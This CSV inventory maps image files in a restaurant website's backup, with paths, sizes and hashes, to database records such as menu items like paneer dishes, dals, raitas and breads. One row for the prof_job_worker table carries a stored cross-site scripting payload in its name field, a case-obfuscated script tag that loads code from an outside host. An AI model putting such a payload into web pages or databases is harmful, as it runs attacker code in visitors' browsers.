19.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/19.jpeg,11233,3fc8d3e9ef519aae52c2883ecb1b0b56873cf7c2ddece261aca374a8ac6554a8,078f3b1748ffd3f185e0a3b479054255,DB Mapped (Verified),menu_item_tbl,19,Fruit Cream,menu_img
190.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/190.jpg,243340,1550f62c049b67364f6a2e72b3f130ca1c92e9f663dd1e39bbf5bed3b3a736e0,ae053f5023a5705b243eab3e7b094837,DB Mapped (Verified),menu_item_tbl,190,TFH Special Paneer,menu_img
191.webp,old-website-php/Full-website-backup/frontEnd/menuimg/191.webp,63704,befd6065aad292e0dc2fc74abfea6495e4fd8320360b4b6b6cb97a5f27e0e417,21f03c992b42791daad53abecb115f3e,DB Mapped (Verified),menu_item_tbl,191,Kadai Paneer,menu_img
192.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/192.jpeg,7704,d2fcb53ef483b5587a0601590b34cd43ec27f4c87cf1b17b66e9df415dbd45b9,c003f13f0aa3fd630b00c185d89a88a9,DB Mapped (Verified),menu_item_tbl,192,Khoya Paneer,menu_img
193.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/193.jpeg,9934,a35c306421bfefc85fe11c7f3fd23f0984b9e08ab5a5c7239fb8768a7b05eee4,2d4a4b45e74abe5251494b18cf4036b0,DB Mapped (Verified),menu_item_tbl,193,Palak Paneer,menu_img
194.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/194.jpeg,12166,5c3359ed62c8e57a455194c7528447670ac36a561a4dd2b82c7194349197f9ab,8b7e78b9912e368a882c9b3faed80dcd,DB Mapped (Verified),menu_item_tbl,194,Paneer Bhurji,menu_img
195.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/195.jpg,150025,f6a249185e3697cac46b6aa02d247360cf70bd238213c9a9d768efac8beefe84,1407ed67a0e9e4965d94b47711554c51,DB Mapped (Verified),menu_item_tbl,195,Stuffed Paneer,menu_img
196.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/196.jpg,199132,4e35879cae1258ccc88766be32d2191e97b64e8a84c4af93eea5d2c25ba7d6ef,2fae8d48ed32089ec61655ab56950a0b,DB Mapped (Verified),menu_item_tbl,196,Shai Paneer,menu_img
197.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/197.jpeg,12427,61eb1232255eb3241e879a476df3d35ccf7521d12773d18466759254e0cb8c97,b184daeaaaecfd260494bacc329715d2,DB Mapped (Verified),menu_item_tbl,197,Paneer Butter Masala,menu_img
198.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/198.jpg,158393,51d126c81eaff573659d8cdfa4b3f6cf1ecdeccc7b870675ba89e9a2ca59c5a8,8777cbad0fdde2087ac722515f240031,DB Mapped (Verified),menu_item_tbl,198,Paneer Pasanda,menu_img
199.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/199.jpeg,11166,65d25c1294c905e6a9495597b87c3e27e5c6ddf1c072295649ef430aadb16b2f,c4e95fa8aaca2cb39282c8bacdf90ebf,DB Mapped (Verified),menu_item_tbl,199,Matar Paneer,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
20.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/20.jpeg,9450,80f6ddb1e64d7228d6ac9e9474f0bb1a0f30ca2ded0a9a3c1031fd6399930c7e,856a09719958bc0b380c8241a6001df4,DB Mapped (Verified),menu_item_tbl,20,Shahi Tudka,menu_img
200.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/200.jpg,193970,50787f75bd29827a1459864964f10a18c96bd80254d492fef9f0d9e575eb50f9,50c2feff106d90ebe1b44af7b4c5812b,DB Mapped (Verified),menu_item_tbl,200,Alu Jeera,menu_img
201.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/201.jpeg,14183,66db385f0093f830d76c3cac3e79fa64d521bbc9be29e24cc945fa0764c21a79,035bb30f09b8b0792584be108f1775d3,DB Mapped (Verified),menu_item_tbl,201,Mix Vegetables(Seasonal),menu_img
202.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/202.jpg,67143,2baae22107ec175b5cadcb676942415760d8e5cfef9b39e3b43d182259c9fc56,e031a1548bf2d787b132602088c62035,DB Mapped (Verified),menu_item_tbl,202,Vegetable Kofta,menu_img
203.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/203.jpg,64987,bdbe5627f3a96ec94b7189bd91d36210af02631faaec8b2c239cce85942762a0,b99005c94fd3ddc847a681518194e936,DB Mapped (Verified),menu_item_tbl,203,Khoya Matter,menu_img
204.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/204.jpeg,10165,073f1f364c8755721868d22db9bdb17d2209a61dea4e0195724bfd038f0f0f5e,a068f2a0ef3a3344e467ca2cfc781c28,DB Mapped (Verified),menu_item_tbl,204,Matar Korma,menu_img
205.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/205.jpg,61202,08db026394ec532381fcf1265bc3f1feaa8ace4e269bbd324f2b69aa5616ee06,1f7a080211762f3b3ad899c4413c1ff9,DB Mapped (Verified),menu_item_tbl,205,Kashmiri Kofta,menu_img
206.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/206.jpg,46295,d5352bcaa158b0d71e022e36496d5d8a73e921bdb047bc4b8f1880d24e3adbc6,9bd12283dfa1795342dcd5aa1e0e822d,DB Mapped (Verified),menu_item_tbl,206,Allo Sikkampuri,menu_img
207.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/207.jpeg,13207,4a578f0e959543a2260f7b2984d1f3d50eba9d501ee61a25263af7c6f742c27e,78d3b652d265893ac5ef2bcf2cca167b,DB Mapped (Verified),menu_item_tbl,207,Mixed Vegetable,menu_img
208.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/208.jpeg,6199,3caaf1f661a63c93e5ff59874412a8607a8afbd3e0eef886577a9b431f45e40b,7efe9fc293b0650c3348c016d6bcd097,DB Mapped (Verified),menu_item_tbl,208,Dry Fruit Vegetable,menu_img
209.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/209.jpeg,10711,95832e20c6c5941323fb90ee667c3d427a0c5bdcf98e13edf54ada57f4a9ef18,51b9da432f03b3df26e9956821d8d0b4,DB Mapped (Verified),menu_item_tbl,209,Sarso Ka Saag,menu_img
21.webp,old-website-php/Full-website-backup/frontEnd/menuimg/21.webp,85368,1e7584fd5691f302bd797b0486cc48db050a3dcaad10d85eb3be8eb911a953a9,e812d6394b30711bb9cf2545784b5f71,DB Mapped (Verified),menu_item_tbl,21,Fruit Custard,menu_img
210.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/210.jpg,15169,1d9be344cf0431155786b801251f1ed68ef7d4fac2fcfd3d38915d0e1d870ef0,c986d89843f1e6c1c7dad77ce9226cab,DB Mapped (Verified),menu_item_tbl,210,Hara Chana,menu_img
211.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/211.jpeg,9628,957379406e22d001ca043ffe086bb7b6ae891483caadf0f6d2dfa01349996ea0,8e6d3af7e1b6aade59d533e1739e4cab,DB Mapped (Verified),menu_item_tbl,211,Hara Chana masala,menu_img
212.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/212.jpg,283472,8f5a8e8cd4396847c938c46a75282e4e46fb5945b7cf8200f486d42e65e4ba57,08775a41e197d8c72607fd5301792931,DB Mapped (Verified),menu_item_tbl,212,Dal Bhukara,menu_img
213.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/213.jpg,308200,f22bf22b1a54b79562cb401ddf449737ada095947c45153fca557d0ff4727c42,b05e1bf78f121472db8382520cbaf33e,DB Mapped (Verified),menu_item_tbl,213,Dal Makhani,menu_img
214.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/214.jpg,45785,c7c919c666eaa7cc73eb4b46ef71198b29202dd33730f2742b9f8368954caec8,899e3a1e7905f058641c60a56e9ab049,DB Mapped (Verified),menu_item_tbl,214,Dal Urad,menu_img
214.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/214.jpg,45785,c7c919c666eaa7cc73eb4b46ef71198b29202dd33730f2742b9f8368954caec8,899e3a1e7905f058641c60a56e9ab049,DB Mapped (Verified),prof_job_worker,214,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
215.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/215.jpg,169050,077990abd7b153d9f25843be033af7047dddf66ad87a073528cb367e1b786f5e,963dfa79758fe28e37b2e552c62f273c,DB Mapped (Verified),menu_item_tbl,215,Dal Palak,menu_img
216.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/216.jpg,187519,74b8b180a0288e2dfa421b762e2f6e06ac4ad536448ac1dd17d138c1de5b82da,45876c1a9dcaa53f6a57d281e7f9e538,DB Mapped (Verified),menu_item_tbl,216,Yellow Dal,menu_img
217.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/217.jpg,204057,a767e5ce6e9bf702a3fc9845ebc6e18ff9383fe40bc12cc4f162d158c3658cc1,4b30945ed7ef01e20bc4992395a62f25,DB Mapped (Verified),menu_item_tbl,217,Masoor Ki Dal,menu_img
218.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/218.jpg,299204,47aa05445dfebddfa316c2ecb7c9f5e60ab23c643885f97a6ee4da88b1a74260,94cdc63c358d7a2a1ec6917fce23660a,DB Mapped (Verified),menu_item_tbl,218,Rajama,menu_img
219.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/219.jpg,240796,2a8a664d640124b2c5e8fddd27fe0d1ea98682450c89244fc9e48a7e1880b430,35237c8065c8c408b255eb55cea92f01,DB Mapped (Verified),menu_item_tbl,219,Rajma Masala,menu_img
22.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/22.jpg,74123,0b23eab0c15efc72abf33cf47ca0a8bf4ab2a7448720ed1fd5d7d4675026f2b5,09d955943b34ba0dbee4816ba1587188,DB Mapped (Verified),menu_item_tbl,22,Kheer,menu_img
22.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/22.jpg,74123,0b23eab0c15efc72abf33cf47ca0a8bf4ab2a7448720ed1fd5d7d4675026f2b5,09d955943b34ba0dbee4816ba1587188,DB Mapped (Verified),product_item_tbl,22,Kathal ka Achaar,menu_img
220.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/220.jpg,146364,90588f84219df2a268d9e3c273a78f9fb93656b19d16e64d221000374a4477ae,9bf98883213393f77dc1c3da0d569ddd,DB Mapped (Verified),menu_item_tbl,220,Kadi Pakora,menu_img
221.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/221.jpg,49801,42051610451802607b6d70b2c19cddd5bf7b2b9d9beef0785c79e2d7ffa3a027,22290cc3b1c49a614476595a467a0675,DB Mapped (Verified),menu_item_tbl,221,TFH Dal Special,menu_img
222.webp,old-website-php/Full-website-backup/frontEnd/menuimg/222.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,222,Dhai Bada,menu_img
222.webp,old-website-php/Full-website-backup/frontEnd/menuimg/222.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,222,Dhai Bada,menu_small_img
223.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/223.jpeg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,223,Boondi Raita,menu_img
223.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/223.jpeg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,223,Boondi Raita,menu_small_img
224.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/224.jpeg,8292,e0053582825091f3f2e012f5424dceca9032b735d9124c67c3ca2662b3cc4367,0ea068556bc40e24fdd6e3d0d9a64d8e,DB Mapped (Verified),menu_item_tbl,224,Mix Fruit Raita,menu_img
224.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/224.jpeg,8292,e0053582825091f3f2e012f5424dceca9032b735d9124c67c3ca2662b3cc4367,0ea068556bc40e24fdd6e3d0d9a64d8e,DB Mapped (Verified),menu_item_tbl,224,Mix Fruit Raita,menu_small_img
225.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/225.jpeg,8497,39e467f30983c7399b5d6391913c66bf1ec4353ce64187a52c0bb297b317ef4d,0fef754850531d457f7df95dc52cc536,DB Mapped (Verified),menu_item_tbl,225,Potato Raita,menu_img
225.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/225.jpeg,8497,39e467f30983c7399b5d6391913c66bf1ec4353ce64187a52c0bb297b317ef4d,0fef754850531d457f7df95dc52cc536,DB Mapped (Verified),menu_item_tbl,225,Potato Raita,menu_small_img
226.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/226.jpeg,6910,755bc357f4bc1e93a014b627a44d1e5dfce2a5f0a7d1713f039be7d2d11fa51c,d9ccb4f8372d6d8f228650bf359862d1,DB Mapped (Verified),menu_item_tbl,226,Loki Ka Raita,menu_img
226.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/226.jpeg,6910,755bc357f4bc1e93a014b627a44d1e5dfce2a5f0a7d1713f039be7d2d11fa51c,d9ccb4f8372d6d8f228650bf359862d1,DB Mapped (Verified),menu_item_tbl,226,Loki Ka Raita,menu_small_img
227.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/227.jpeg,8086,6fdd6ae667115c1ce559c76558b3493417ec76f2e01ebd8c73c7cccef78ca712,f4318030ced70d7c2ee7f646584f85af,DB Mapped (Verified),menu_item_tbl,227,Khire ka Raita,menu_img
227.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/227.jpeg,8086,6fdd6ae667115c1ce559c76558b3493417ec76f2e01ebd8c73c7cccef78ca712,f4318030ced70d7c2ee7f646584f85af,DB Mapped (Verified),menu_item_tbl,227,Khire ka Raita,menu_small_img
228.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/228.jpg,14258,d703466b90bb952894d6e7bbddd5e6a8417619721030e501970fcec5b27a9bbe,41e02c5fe7878544fdb7712f3f83df16,DB Mapped (Verified),menu_item_tbl,228,Pineapple Raita,menu_img
228.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/228.jpg,14258,d703466b90bb952894d6e7bbddd5e6a8417619721030e501970fcec5b27a9bbe,41e02c5fe7878544fdb7712f3f83df16,DB Mapped (Verified),menu_item_tbl,228,Pineapple Raita,menu_small_img
229.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/229.jpeg,8524,327d812f278bcad23a0cc4b04b9b3a5e285fad43e0e945161d7ca11add0908db,ec0c88f969cc12d313687e8b065d9d54,DB Mapped (Verified),menu_item_tbl,229,TFH Special Raita,menu_img
229.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/229.jpeg,8524,327d812f278bcad23a0cc4b04b9b3a5e285fad43e0e945161d7ca11add0908db,ec0c88f969cc12d313687e8b065d9d54,DB Mapped (Verified),menu_item_tbl,229,TFH Special Raita,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),product_item_tbl,23,Lal Mirch ka Bharua Achar,menu_img
230.webp,old-website-php/Full-website-backup/frontEnd/menuimg/230.webp,23972,63d738238f6b42a4904a1fbaa6d0b29d36b727563a5ad39cf0a2ab638cfdc8f2,a33e40e6e1de87420250929aa1da4b86,DB Mapped (Verified),menu_item_tbl,230,Roasted Papad,menu_img
230.webp,old-website-php/Full-website-backup/frontEnd/menuimg/230.webp,23972,63d738238f6b42a4904a1fbaa6d0b29d36b727563a5ad39cf0a2ab638cfdc8f2,a33e40e6e1de87420250929aa1da4b86,DB Mapped (Verified),menu_item_tbl,230,Roasted Papad,menu_small_img
231.webp,old-website-php/Full-website-backup/frontEnd/menuimg/231.webp,46218,35287aef0d9e279871e11ff09c5cb4869763c62a8adc6518d7becf794657fb47,218704947a4de14dd6c2d9e092803b0c,DB Mapped (Verified),menu_item_tbl,231,Lijjat Papad,menu_img
231.webp,old-website-php/Full-website-backup/frontEnd/menuimg/231.webp,46218,35287aef0d9e279871e11ff09c5cb4869763c62a8adc6518d7becf794657fb47,218704947a4de14dd6c2d9e092803b0c,DB Mapped (Verified),menu_item_tbl,231,Lijjat Papad,menu_small_img
232.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/232.jpg,27003,4c65db39d6bdd547bb8a9dc5f366bc59f43ab0d75359516eb414a6758d6a885a,7190f2e5b2d7f32b9c84efcc4b741286,DB Mapped (Verified),menu_item_tbl,232,Papad ki Churi,menu_img
232.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/232.jpg,27003,4c65db39d6bdd547bb8a9dc5f366bc59f43ab0d75359516eb414a6758d6a885a,7190f2e5b2d7f32b9c84efcc4b741286,DB Mapped (Verified),menu_item_tbl,232,Papad ki Churi,menu_small_img
233.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/233.jpeg,7448,62927a41c2d91d8294f5a41b741433b8211f58e86aa9eed268341227e93d2743,b8cb73bed74866cab57ec1f6ddb73f87,DB Mapped (Verified),menu_item_tbl,233,Sabudane Ka Papad,menu_img
233.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/233.jpeg,7448,62927a41c2d91d8294f5a41b741433b8211f58e86aa9eed268341227e93d2743,b8cb73bed74866cab57ec1f6ddb73f87,DB Mapped (Verified),menu_item_tbl,233,Sabudane Ka Papad,menu_small_img
234.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/234.jpg,30108,6900419f810f24ac3f44e4a7337e9cb758b93c9c3ff5f850be361a95dfe9f9e9,653aadcf0557560c88e1691ce8231cf7,DB Mapped (Verified),menu_item_tbl,234,Fry Papad,menu_img
234.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/234.jpg,30108,6900419f810f24ac3f44e4a7337e9cb758b93c9c3ff5f850be361a95dfe9f9e9,653aadcf0557560c88e1691ce8231cf7,DB Mapped (Verified),menu_item_tbl,234,Fry Papad,menu_small_img
235.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/235.jpg,13338,6617b0de8428fd2d94bdf20a9662fb89b98f489ff32bf2f819470c35d8685030,1ac290d2c80919b37fd2c526f091e3a6,DB Mapped (Verified),menu_item_tbl,235,Allo Ka Papad,menu_img
235.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/235.jpg,13338,6617b0de8428fd2d94bdf20a9662fb89b98f489ff32bf2f819470c35d8685030,1ac290d2c80919b37fd2c526f091e3a6,DB Mapped (Verified),menu_item_tbl,235,Allo Ka Papad,menu_small_img
236.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/236.jpg,22003,1a11a020cdb84e7f6f07286577c423cb3792e01eb8f364d4c9aa57e115f026ba,861db002f905a6a9a6674832a31e8b53,DB Mapped (Verified),menu_item_tbl,236,Missi Phulka,menu_img
236.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/236.jpg,22003,1a11a020cdb84e7f6f07286577c423cb3792e01eb8f364d4c9aa57e115f026ba,861db002f905a6a9a6674832a31e8b53,DB Mapped (Verified),menu_item_tbl,236,Missi Phulka,menu_small_img
237.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/237.jpeg,8899,b7ede46c107c61ca7d1e1410c57b560d51d6472b6fa254ca9af191ae2611b7cd,1e4d6d582440f97828273c9f466e441b,DB Mapped (Verified),menu_item_tbl,237,Chupdi Chapati,menu_img
237.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/237.jpeg,8899,b7ede46c107c61ca7d1e1410c57b560d51d6472b6fa254ca9af191ae2611b7cd,1e4d6d582440f97828273c9f466e441b,DB Mapped (Verified),menu_item_tbl,237,Chupdi Chapati,menu_small_img
238.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/238.jpg,43825,b1ffb339b10c4713ae6e20223ea4f066fa81f36c63fb676836939afb4cc15d54,e3dd53add82387b2430e03ed472a02ba,DB Mapped (Verified),menu_item_tbl,238,Makka Ki Roti,menu_img
238.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/238.jpg,43825,b1ffb339b10c4713ae6e20223ea4f066fa81f36c63fb676836939afb4cc15d54,e3dd53add82387b2430e03ed472a02ba,DB Mapped (Verified),menu_item_tbl,238,Makka Ki Roti,menu_small_img
239.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/239.jpg,64217,6725257360adfaeb06f0adbbf912aa735087293de116d7c079082b466593687e,763ef511a5dcc2a74896137445411dfc,DB Mapped (Verified),menu_item_tbl,239,Bajre Ki Roti,menu_img
239.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/239.jpg,64217,6725257360adfaeb06f0adbbf912aa735087293de116d7c079082b466593687e,763ef511a5dcc2a74896137445411dfc,DB Mapped (Verified),menu_item_tbl,239,Bajre Ki Roti,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
240.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/240.jpg,16321,b505b518a6429ea4ba732a8136941fc135c6418c0ed221847c1b9a2b09aa8a2a,68c274bae5a2e10c377885a14ebba6e3,DB Mapped (Verified),menu_item_tbl,240,Karela Sutff,menu_img
240.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/240.jpg,16321,b505b518a6429ea4ba732a8136941fc135c6418c0ed221847c1b9a2b09aa8a2a,68c274bae5a2e10c377885a14ebba6e3,DB Mapped (Verified),menu_item_tbl,240,Karela Sutff,menu_small_img
241.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/241.jpg,11813,78af8d714d0abcb79f08c64d8f979c24c1bb6038ba70274dd945d715e260954c,bf55be84d2c83514c5b1d6fa36bcec74,DB Mapped (Verified),menu_item_tbl,241,Bhindi Stuff,menu_img
241.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/241.jpg,11813,78af8d714d0abcb79f08c64d8f979c24c1bb6038ba70274dd945d715e260954c,bf55be84d2c83514c5b1d6fa36bcec74,DB Mapped (Verified),menu_item_tbl,241,Bhindi Stuff,menu_small_img
242.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/242.jpg,10596,4c16de6415d9bf4c0e31ff9faa0ded85e1f53a142fe29c7f439b25a0107a43eb,09dc8d17021d1512bcf878c9cc99616d,DB Mapped (Verified),menu_item_tbl,242,Arabi,menu_img
242.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/242.jpg,10596,4c16de6415d9bf4c0e31ff9faa0ded85e1f53a142fe29c7f439b25a0107a43eb,09dc8d17021d1512bcf878c9cc99616d,DB Mapped (Verified),menu_item_tbl,242,Arabi,menu_small_img
243.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/243.jpg,16386,ed727ba7e1268b553621b73053b220487226f546a4ded1cffcfad8819a2eb88b,32280c588aa55e25e2857410f23b86e9,DB Mapped (Verified),menu_item_tbl,243,Stuffed Tomato,menu_img
243.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/243.jpg,16386,ed727ba7e1268b553621b73053b220487226f546a4ded1cffcfad8819a2eb88b,32280c588aa55e25e2857410f23b86e9,DB Mapped (Verified),menu_item_tbl,243,Stuffed Tomato,menu_small_img
244.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/244.jpg,13853,3fc3dab2cf3f40b9eaf67d3400fa26d67ecb3bf111071c33224a9590065e80e5,a9b1777e96f8b4fa339d5230c28fccc4,DB Mapped (Verified),menu_item_tbl,244,Stuffed Shimla Mirch,menu_img
244.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/244.jpg,13853,3fc3dab2cf3f40b9eaf67d3400fa26d67ecb3bf111071c33224a9590065e80e5,a9b1777e96f8b4fa339d5230c28fccc4,DB Mapped (Verified),menu_item_tbl,244,Stuffed Shimla Mirch,menu_small_img
245.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/245.jpg,14332,1370b1ca0345cfe499c6f1aeb413cb2795a12ef47f03a5eddcb31f82bb68a0f6,7d8fa6af9a96928a80ae53f2f8fffa4e,DB Mapped (Verified),menu_item_tbl,245,Sada Puri,menu_img
245.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/245.jpg,14332,1370b1ca0345cfe499c6f1aeb413cb2795a12ef47f03a5eddcb31f82bb68a0f6,7d8fa6af9a96928a80ae53f2f8fffa4e,DB Mapped (Verified),menu_item_tbl,245,Sada Puri,menu_small_img
246.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/246.jpeg,7367,32035ac49824f2f6b60544e2f5f998d708c4364abede08cf7bd2b954fd0b0f3d,cdfc27aaf041e86f778ed7c33fdd5741,DB Mapped (Verified),menu_item_tbl,246,Ajwain Puri,menu_img
246.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/246.jpeg,7367,32035ac49824f2f6b60544e2f5f998d708c4364abede08cf7bd2b954fd0b0f3d,cdfc27aaf041e86f778ed7c33fdd5741,DB Mapped (Verified),menu_item_tbl,246,Ajwain Puri,menu_small_img
247.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/247.jpeg,10172,87eb9affdd79b982c90eb3f624982194d76ec7501b4c76512382a50d5acc880c,05bb1d90ac9ed27448cdd91640a73c32,DB Mapped (Verified),menu_item_tbl,247,Palak Puri,menu_img
247.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/247.jpeg,10172,87eb9affdd79b982c90eb3f624982194d76ec7501b4c76512382a50d5acc880c,05bb1d90ac9ed27448cdd91640a73c32,DB Mapped (Verified),menu_item_tbl,247,Palak Puri,menu_small_img
248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_img
248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_small_img
